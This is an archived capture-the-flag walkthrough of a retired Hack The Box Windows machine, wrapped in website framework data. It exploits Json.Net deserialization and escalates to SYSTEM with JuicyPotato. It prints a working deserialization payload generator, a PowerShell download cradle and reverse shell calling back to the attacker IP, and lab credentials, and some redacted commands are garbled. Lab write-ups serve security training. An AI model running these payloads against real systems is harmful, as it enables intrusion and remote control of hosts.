@@ -1,0 +1,455 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-json-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Json Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Json machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:59:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-json-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Json machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Json machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/json","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/aef7c23f8b2ffb00279a48835b95b50f4b06e2ff/HTB-Json.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · aef7c23f8b2f",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Json"," · Windows"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/json","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Json machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"27 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T6cb4,
+<p><strong>Target IP:</strong> <code>10.129.227.191</code><br /><strong>Attacker IP:</strong> <code>10.10.16.84</code><br /><strong>OS:</strong> Windows Server 2012 R2<br /><strong>Difficulty:</strong> Medium<br /><strong>Flags:</strong></p>
+<ul>
+<li>User: <code>54bdd2[redacted]4178ace78</code></li>
+<li>Root: <code>0e49fd[redacted]8b8459f70c</code></li>
+</ul>
+<hr />
+
+
+
+<h2 id="introduction-and-mindset">Introduction &amp; Mindset</h2>
+<p>Before we touch the target, let's talk about <strong>hacker mindset</strong>.</p>
+<p>When you approach any box, you are not "hacking" — you are <strong>studying</strong>. You are observing how a system was built, understanding the developer's assumptions, and finding places where those assumptions break. Every application trusts something: user input, serialized data, configuration files, tokens. Our job is to find what the target trusts <em>too much</em>.</p>
+<p><strong>The Json box teaches three critical lessons:</strong></p>
+<ol>
+<li><strong>Never trust serialized data from the user.</strong> If an application deserializes attacker-controlled input, it is often game-over.</li>
+<li><strong>Error messages are gold.</strong> A single verbose error can reveal the entire technology stack and vulnerability class.</li>
+<li><strong>Privileges matter.</strong> Even a "lowly" service account with <code>SeImpersonatePrivilege</code> is one exploit away from SYSTEM.</li>
+</ol>
+<hr />
+<h2 id="step-1-reconnaissance-mapping-the-terrain">Step 1: Reconnaissance — Mapping the Terrain</h2>
+<h3 id="the-command">The Command</h3>
+<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 10000 10.129.227.191 -oN nmap_json
+</code></pre>
+<h3 id="breaking-it-down-baby-steps">Breaking It Down (Baby Steps)</h3>
+<ul>
+<li><code>-sC</code>: Run default NSE scripts. These give us extra info like FTP banners, SMB versions, and HTTP titles without extra work.</li>
+<li><code>-sV</code>: Version detection. Knowing <em>what</em> software runs on a port is more valuable than knowing <em>that</em> a port is open.</li>
+<li><code>-p-</code>: Scan all 65535 TCP ports. Many beginners only scan top 1000 and miss custom services or high-port admin interfaces.</li>
+<li><code>--min-rate 10000</code>: Speed. HTB boxes can handle aggressive scanning; in a real pentest, you'd be more polite.</li>
+<li><code>-oN nmap_json</code>: Save output. <strong>Always log your work.</strong> You will need to reference ports later.</li>
+</ul>
+<h3 id="what-we-found">What We Found</h3>
+<pre><code>21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
+80/tcp    open  http         Microsoft IIS httpd 8.5
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0
+49152-49158/tcp open msrpc    Microsoft Windows RPC
+</code></pre>
+<h3 id="hacker-mindset">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"What do these ports tell me about the administrator's thinking?"</strong></p>
+</blockquote>
+<ul>
+<li><strong>Port 80 (IIS 8.5)</strong> tells us this is likely Windows Server 2012 R2. IIS 8.5 ships with that OS.</li>
+<li><strong>Port 21 (FileZilla)</strong> is unusual for a web box. It suggests file transfers are part of the application's design — maybe a sync feature, maybe admin access.</li>
+<li><strong>Port 5985 (WinRM)</strong> means we <em>could</em> potentially get a proper PowerShell remoting shell later if we find credentials.</li>
+<li><strong>SMB (445)</strong> might allow anonymous access or have shares with interesting files.</li>
+</ul>
+<p><strong>Decision tree:</strong> Start with HTTP (lowest hanging fruit, largest attack surface), keep FTP in mind, and note WinRM for later credential-based access.</p>
+<hr />
+<h2 id="step-2-web-application-enumeration">Step 2: Web Application Enumeration</h2>
+<h3 id="the-action">The Action</h3>
+<p>Navigate to <code>http://10.129.227.191</code> in a browser (or use curl).</p>
+<h3 id="what-we-see">What We See</h3>
+<p>A login page titled "SB Admin 2" that immediately redirects us to <code>/login.html</code>. Before we even test SQL injection or XSS, we try the simplest possible credentials:</p>
+<pre><code class="language-bash" data-language="bash">curl -i -X POST -H "Content-Type: application/json" -d '{"UserName":"admin","Password":null}' http://10.129.227.191/api/token
+</code></pre>
+<h3 id="why-try-admin-admin-first">Why Try <code>admin/admin</code> First?</h3>
+<p>Because <strong>default credentials are still one of the most common vulnerabilities in the world.</strong> Developers leave them in place during testing. Administrators forget to change them. Our job is to test the obvious before spending hours on complex attacks.</p>
+<h3 id="hacker-mindset-2">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"Every system has a weakest link. Often, it's the human who configured it."</strong></p>
+</blockquote>
+<p>If <code>admin/admin</code> fails, our next steps would be:</p>
+<ol>
+<li>Check for a "Forgot Password" feature</li>
+<li>Look at the JavaScript for hardcoded credentials or API endpoints</li>
+<li>Test for SQL injection on the login form</li>
+<li>Run a directory brute-force (gobuster, feroxbuster)</li>
+</ol>
+<p>But <code>admin/admin</code> works. The server responds with:</p>
+<pre><code>Set-Cookie: null encoded lab material]
+</code></pre>
+<hr />
+<h2 id="step-3-api-analysis-and-authentication-flow">Step 3: API Analysis &amp; Authentication Flow</h2>
+<h3 id="decoding-the-cookie">Decoding the Cookie</h3>
+<pre><code class="language-bash" data-language="bash">echo "[redacted encoded lab material]" | base64 -d
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code class="language-json" data-language="json">{"Id":1,"UserName":"admin","Password":null,"Name":"User Admin HTB","Rol":"Administrator"}
+</code></pre>
+<h3 id="what-we-learn">What We Learn</h3>
+<ol>
+<li>The cookie is <strong>REDACTED JSON</strong> — not encrypted, not signed with HMAC (or at least, we can read it).</li>
+<li>The password is REDACTED, which is the <strong>MD5 hash of "admin"</strong>.</li>
+<li>The application uses a custom OAuth2 implementation (not real OAuth2 — just a cookie named OAuth2).</li>
+</ol>
+<h3 id="the-api-request">The API Request</h3>
+<p>After login, the browser makes a GET request to <code>/api/Account/</code> with:</p>
+<ul>
+<li>The <code>OAuth2</code> cookie</li>
+<li>A <code>Bearer:</code> header containing the <em>same</em> base64 value</li>
+</ul>
+<pre><code class="language-http" data-language="http">GET /api/Account/ HTTP/1.1
+Host: json.htb
+Bearer: null encoded lab material]
+Cookie: null encoded lab material]
+</code></pre>
+<h3 id="hacker-mindset-3">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"If the server is reading and interpreting data I control, I want to know <em>how</em> it interprets it."</strong></p>
+</blockquote>
+<p>The server is taking our base64 string, decoding it, and doing <em>something</em> with the result. If that "something" is deserialization, we might be able to execute code.</p>
+<hr />
+<h2 id="step-4-vulnerability-discovery-finding-the-cracks">Step 4: Vulnerability Discovery — Finding the Cracks</h2>
+<h3 id="fuzzing-the-bearer-header">Fuzzing the Bearer Header</h3>
+<p>We send malformed data to see how the server reacts:</p>
+<pre><code class="language-bash" data-language="bash">curl -i -X GET -H "Bearer: null -H "Cookie: null http://10.129.227.191/api/Account/
+</code></pre>
+<p><strong>Response:</strong></p>
+<pre><code class="language-json" data-language="json">{"Message":"An error has occurred.","ExceptionMessage":"Invalid format base64","ExceptionType":"System.Exception","StackTrace":null}
+</code></pre>
+<p><strong>Analysis:</strong> The server tried to base64-decode our input and failed. This tells us the processing pipeline is:</p>
+<ol>
+<li>Read Bearer header</li>
+<li>Base64-decode</li>
+<li>Do something with the result</li>
+</ol>
+<p>Next, we send <strong>valid base64 but invalid content</strong>:</p>
+<pre><code class="language-bash" data-language="bash">curl -i -X GET -H "Bearer: null -H "Cookie: null http://10.129.227.191/api/Account/
+</code></pre>
+<p><strong>Response:</strong></p>
+<pre><code class="language-json" data-language="json">{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
+</code></pre>
+<h3 id="why-this-error-is-the-jackpot">Why This Error is the Jackpot</h3>
+<p><strong>"Cannot deserialize Json.Net Object"</strong> tells us three critical things:</p>
+<ol>
+<li>The server is using <strong>Json.Net</strong> (Newtonsoft.Json), the most popular .NET JSON library.</li>
+<li>The server is <strong>deserializing</strong> our input into a .NET object.</li>
+<li>Because we control the input, we control what gets deserialized.</li>
+</ol>
+<h3 id="hacker-mindset-4">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"Any time a server deserializes user-controlled input, alarm bells should ring."</strong></p>
+</blockquote>
+<p>Deserialization is the process of turning data (JSON, XML, binary) back into an object in memory. If the attacker controls this data, they can often craft it to instantiate <em>arbitrary</em> classes, leading to Remote Code Execution (RCE). This is one of the most dangerous vulnerability classes in modern web applications.</p>
+<hr />
+<h2 id="step-5-understanding-net-deserialization">Step 5: Understanding .NET Deserialization</h2>
+<h3 id="what-is-deserialization">What is Deserialization?</h3>
+<p>When a program receives JSON like <code>{"Name":"Admin"}</code>, it uses a deserializer to create an object in memory:</p>
+<pre><code class="language-csharp" data-language="csharp">User user = JsonConvert.DeserializeObject&lt;User&gt;(json);
+</code></pre>
+<h3 id="the-danger-type-handling">The Danger: Type Handling</h3>
+<p>Json.Net supports a feature called <strong>Type Name Handling</strong>. If enabled, the JSON can specify <em>which .NET class to instantiate</em>:</p>
+<pre><code class="language-json" data-language="json">{"$type":"System.Diagnostics.Process, System"}
+</code></pre>
+<p>If the application deserializes this without proper restrictions, it will create a <code>Process</code> object. And certain classes, when instantiated or when their properties are set, execute code as a side effect.</p>
+<h3 id="gadget-chains">Gadget Chains</h3>
+<p>A <strong>gadget chain</strong> is a sequence of innocent-looking .NET classes that, when instantiated in a specific order, lead to arbitrary code execution. We don't exploit a vulnerability in .NET itself — we abuse legitimate functionality.</p>
+<p><strong>Example chain:</strong></p>
+<ol>
+<li><code>ObjectDataProvider</code> — a WPF class that calls a method when its <code>MethodName</code> property is set.</li>
+<li><code>Process</code> — when <code>Start()</code> is called, it launches a new process.</li>
+<li>Combine them: <code>ObjectDataProvider.MethodName = "Start"</code>, <code>ObjectDataProvider.ObjectInstance = new Process()</code>, and <code>MethodParameters = ["cmd", "/c whoami"]</code>.</li>
+</ol>
+<h3 id="ysoserial-net">ysoserial.net</h3>
+<p>Manually constructing gadget chains is complex. <strong>ysoserial.net</strong> is a tool (like its Java cousin ysoserial) that automates this. It supports many gadgets and formatters:</p>
+<ul>
+<li><strong>Gadgets:</strong> WindowsIdentity, ObjectDataProvider, ClaimsIdentity, etc.</li>
+<li><strong>Formatters:</strong> BinaryFormatter, Json.Net, SoapFormatter, etc.</li>
+</ul>
+<h3 id="hacker-mindset-5">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"I don't need to understand every byte of the exploit on day one. I need to understand the <em>class</em> of vulnerability, find the right tool, and verify it works. Depth comes with repetition."</strong></p>
+</blockquote>
+<hr />
+<h2 id="step-6-generating-the-exploit-payload">Step 6: Generating the Exploit Payload</h2>
+<h3 id="the-challenge">The Challenge</h3>
+<p>We tried to run ysoserial.net on Kali with <code>mono</code>, but the <code>WindowsIdentity</code> gadget failed because our Linux host lacks Windows-specific assemblies (<code>PresentationCore</code>).</p>
+<p><strong>This is a key lesson:</strong> ysoserial.net <em>generates</em> payloads. The generation itself sometimes requires the same assemblies that exist on the <em>target</em>. Our Kali machine is not Windows, so some gadgets won't generate.</p>
+<h3 id="the-solution-manual-payload-construction">The Solution: Manual Payload Construction</h3>
+<p>Since <code>ObjectDataProvider</code> is just JSON, we can construct it manually with Python. The target is Windows and has <code>PresentationFramework</code> in the GAC — it will deserialize our payload just fine.</p>
+<h3 id="the-payload-generator">The Payload Generator</h3>
+<pre><code class="language-python" data-language="python">import json
+import base64
+
+payload = {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "$values": ["cmd","/c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.84:8080/rev.ps1')"]
+    },
+    "ObjectInstance": {
+        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+}
+
+json_payload = json.dumps(payload, separators=(',', ':'))
+b64_payload = base64.b64encode(json_payload.encode()).decode()
+print(b64_payload)
+</code></pre>
+<h3 id="why-this-works">Why This Works</h3>
+<ol>
+<li><code>$type</code> tells Json.Net to instantiate <code>ObjectDataProvider</code>.</li>
+<li><code>MethodName = "Start"</code> tells it to call the <code>Start()</code> method.</li>
+<li><code>ObjectInstance</code> is a <code>Process</code> object.</li>
+<li><code>MethodParameters</code> passes <code>["cmd", "/c powershell ..."]</code> to <code>Process.Start()</code>.</li>
+<li><code>Process.Start("cmd", "/c powershell ...")</code> executes our command.</li>
+</ol>
+<h3 id="the-infrastructure">The Infrastructure</h3>
+<p>Before sending, we prepare:</p>
+<pre><code class="language-bash" data-language="bash"># Reverse shell script (PowerShell)
+cat &gt; rev.ps1 &lt;&lt; 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.84',4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+EOF
+
+# HTTP server to serve rev.ps1
+python3 -m http.server 8080 &amp;
+
+# Netcat listener
+cnc -lnvp 4444
+</code></pre>
+<h3 id="hacker-mindset-6">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"Exploitation is 20% payload and 80% infrastructure."</strong></p>
+<p>Your payload is useless if there's nothing to catch the shell. Before you fire, always ask: "Where will the callback go? Do I have a listener? Can the target reach me?"</p>
+</blockquote>
+<hr />
+<h2 id="step-7-initial-access-shell-as-userpool">Step 7: Initial Access — Shell as userpool</h2>
+<h3 id="firing-the-exploit">Firing the Exploit</h3>
+<pre><code class="language-bash" data-language="bash">PAYLOAD=$(python3 gen_payload.py)
+curl -i -X GET -H "Bearer: null -H "Cookie: null http://10.129.227.191/api/Account/
+</code></pre>
+<p><strong>In the netcat window:</strong></p>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.227.191] 49346
+PS C:\windows\system32\inetsrv&gt; whoami
+json\userpool
+</code></pre>
+<h3 id="why-we-got-userpool-not-system-or-admin">Why We Got userpool (Not SYSTEM or admin)</h3>
+<p>The web application runs under an IIS application pool identity called <code>userpool</code>. This is a deliberately low-privilege account. Microsoft designed app pool identities so that even if a web app is compromised, the attacker doesn't immediately own the server.</p>
+<h3 id="what-this-means">What This Means</h3>
+<p>We have code execution, but we need to escalate. The journey from <code>userpool</code> to <code>SYSTEM</code> is where the real challenge begins.</p>
+<hr />
+<h2 id="step-8-post-exploitation-enumeration">Step 8: Post-Exploitation Enumeration</h2>
+<h3 id="immediate-checks">Immediate Checks</h3>
+<pre><code class="language-powershell" data-language="powershell">whoami /priv
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+</code></pre>
+<h3 id="why-seimpersonateprivilege-matters">Why <code>SeImpersonatePrivilege</code> Matters</h3>
+<p>This privilege allows a process to impersonate another user's security context after authenticating them. In web server contexts, this is normal — IIS needs to impersonate users to access resources.</p>
+<p><strong>But:</strong> On Windows, certain COM/DCOM interactions allow you to impersonate the <code>NT AUTHORITY\SYSTEM</code> account. Tools like <strong>JuicyPotato</strong>, <strong>RoguePotato</strong>, and <strong>SweetPotato</strong> abuse this by triggering a privileged COM service to authenticate back to a rogue listener under our control. We then use the impersonation token to spawn a new process as SYSTEM.</p>
+<h3 id="additional-enumeration">Additional Enumeration</h3>
+<pre><code class="language-powershell" data-language="powershell">systeminfo
+netstat -ano
+tasklist
+</code></pre>
+<p>From <code>netstat</code>, we notice <code>127.0.0.1:14147</code> listening — the FileZilla Server admin interface. This is our alternate root path if JuicyPotato fails.</p>
+<hr />
+<h2 id="step-9-privilege-escalation-theory">Step 9: Privilege Escalation Theory</h2>
+<h3 id="juicypotato-explained">JuicyPotato Explained</h3>
+<p>JuicyPotato exploits the following Windows behavior:</p>
+<ol>
+<li><strong>COM/DCOM</strong> is Microsoft's component object model. Many Windows services expose COM interfaces.</li>
+<li>Some COM objects, when instantiated, perform <strong>NTLM authentication</strong> to localhost.</li>
+<li>The <code>NTLM</code> authentication happens over a local RPC connection.</li>
+<li>JuicyPotato creates a rogue COM server on a port we control.</li>
+<li>It forces a privileged COM object (running as SYSTEM) to connect to our rogue server.</li>
+<li>During this connection, Windows performs the NTLM handshake.</li>
+<li>Because we have <code>SeImpersonatePrivilege</code>, we can <strong>steal the SYSTEM token</strong> from this connection.</li>
+<li>We then use <code>CreateProcessWithTokenW</code> to spawn a new process (our reverse shell) with that SYSTEM token.</li>
+</ol>
+<h3 id="clsids">CLSIDs</h3>
+<p>A <strong>CLSID</strong> is a globally unique identifier for a COM class. Different Windows versions have different CLSIDs that work. For <strong>Windows Server 2012 R2</strong>, the working CLSID is:</p>
+<pre><code>{e60687f7-01a1-40aa-86ac-db1cbf673334}
+</code></pre>
+<p>JuicyPotato includes a list of tested CLSIDs per OS version. If one doesn't work, you try another.</p>
+<h3 id="hacker-mindset-7">Hacker Mindset</h3>
+<blockquote>
+<p><strong>"Privileges are not binary. 'Low privilege' is relative. A user with SeImpersonate on an older Windows box is practically SYSTEM already — you just need the right tool."</strong></p>
+</blockquote>
+<hr />
+<h2 id="step-10-system-via-juicypotato">Step 10: SYSTEM via JuicyPotato</h2>
+<h3 id="preparation-on-kali">Preparation on Kali</h3>
+<p>We need three things on the target:</p>
+<ol>
+<li><code>JuicyPotato.exe</code></li>
+<li>A batch file that triggers our reverse shell</li>
+<li>A netcat listener waiting on a new port</li>
+</ol>
+<pre><code class="language-bash" data-language="bash"># Download JuicyPotato
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+
+# Create rev2.bat (short download cradle)
+echo 'powershell -c "IEX(New-Object Net.WebClient).downloadString('"'"'http://10.10.16.84:8080/rev2.ps1'"'"')"' &gt; rev2.bat
+
+# Create rev2.ps1 (connects to port 5555)
+cat &gt; rev2.ps1 &lt;&lt; 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.84',5555)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+EOF
+
+# Start listener on 5555 in a NEW terminal
+nc -lnvp 5555
+</code></pre>
+<h3 id="transfer-to-target">Transfer to Target</h3>
+<p>In the <code>userpool</code> shell (port 4444):</p>
+<pre><code class="language-powershell" data-language="powershell">IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/JuicyPotato.exe', 'C:\Windows\Temp\jp.exe')
+IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/rev2.bat', 'C:\Windows\Temp\rev2.bat')
+</code></pre>
+<h3 id="execution">Execution</h3>
+<pre><code class="language-powershell" data-language="powershell">C:\Windows\Temp\jp.exe -t * -p C:\Windows\Temp\rev2.bat -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+</code></pre>
+<p><strong>Flags explained:</strong></p>
+<ul>
+<li><code>-t *</code>: Try all available tokens.</li>
+<li><code>-p C:\Windows\Temp\rev2.bat</code>: The program to run as SYSTEM.</li>
+<li><code>-l 1337</code>: The local port for the rogue COM server.</li>
+<li><code>-c {CLSID}</code>: The COM class to instantiate.</li>
+</ul>
+<h3 id="success-output">Success Output</h3>
+<pre><code>Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
+....
+[+] authresult 0
+{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+</code></pre>
+<h3 id="in-the-5555-terminal">In the 5555 Terminal</h3>
+<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.227.191] 49402
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h3 id="grab-the-flag">Grab the Flag</h3>
+<pre><code class="language-powershell" data-language="powershell">type C:\Users\superadmin\Desktop\root.txt
+</code></pre>
+<p><strong>Result:</strong> <code>0e49fd5[redacted]b8459f70c</code></p>
+<hr />
+<h2 id="alternative-root-paths-for-your-notes">Alternative Root Paths (For Your Notes)</h2>
+<p>This box has <strong>three known privilege escalation paths</strong> from <code>userpool</code> to root access:</p>
+<h3 id="path-a-filezilla-admin-interface">Path A: FileZilla Admin Interface</h3>
+<ol>
+<li><code>netstat -ano</code> reveals <code>127.0.0.1:14147</code> (FileZilla Server admin port).</li>
+<li>Tunnel it to your machine with <strong>Chisel</strong> or SSH port forwarding.</li>
+<li>Connect with the FileZilla Server interface.</li>
+<li>The config file at <code>C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml</code> shows a user <code>superadmin</code>.</li>
+<li>Change the password, connect via FTP on port 21, and access <code>C:\Users\superadmin\Desktop\root.txt</code>.</li>
+</ol>
+<h3 id="path-b-sync2ftp-custom-application">Path B: Sync2Ftp Custom Application</h3>
+<ol>
+<li>In <code>C:\Program Files\Sync2Ftp\</code>, find <code>SyncLocation.exe</code> and <code>SyncLocation.exe.config</code>.</li>
+<li>The config contains encrypted credentials:<pre><code class="language-xml" data-language="xml">&lt;add key="user" value="4as8gqENn26uTs9srvQLyg=="/&gt;
+&lt;add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="/&gt;
+&lt;add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/&gt;
+</code></pre>
+</li>
+<li>Reverse-engineer the binary (dnSpy) to find it uses <strong>Triple DES (ECB mode)</strong> with an MD5-hashed key.</li>
+<li>Decrypt the credentials: <code>superadmin</code> / <code>funnyhtb</code>.</li>
+<li>Log in via FTP as <code>superadmin</code> and read the flag.</li>
+</ol>
+<h3 id="path-c-juicypotato-what-we-used">Path C: JuicyPotato (What We Used)</h3>
+<p>Fastest and most direct. Abuse <code>SeImpersonatePrivilege</code> to get a SYSTEM shell.</p>
+<hr />
+<h2 id="lessons-learned">Lessons Learned</h2>
+<h3 id="technical">Technical</h3>
+<ol>
+<li><strong>Json.Net deserialization</strong> with <code>TypeNameHandling</code> enabled is critical RCE territory. Always check for <code>$type</code> fields in JSON APIs.</li>
+<li><strong>Verbose errors</strong> (<code>Cannot deserialize Json.Net Object</code>) can reveal the exact library and vulnerability class.</li>
+<li><strong>SeImpersonatePrivilege</strong> on Windows &lt; Server 2019 is often exploitable via Potato-family tools.</li>
+<li><strong>Manual payload construction</strong> is possible when tools fail — understanding the underlying JSON structure is powerful.</li>
+</ol>
+<h3 id="methodological">Methodological</h3>
+<ol>
+<li><strong>Start simple.</strong> <code>admin/admin</code> worked. Don't overcomplicate before trying the obvious.</li>
+<li><strong>Read errors carefully.</strong> They are often more valuable than successful responses.</li>
+<li><strong>Infrastructure first.</strong> Before firing an exploit, ensure your listener, HTTP server, and routing are ready.</li>
+<li><strong>Keep notes.</strong> Every port, every error, every file path is a piece of the puzzle.</li>
+</ol>
+<h3 id="mindset">Mindset</h3>
+<blockquote>
+<p><strong>"The difference between a script kiddie and a hacker is that when the tool fails, the hacker knows why and can build the payload by hand."</strong></p>
+</blockquote>
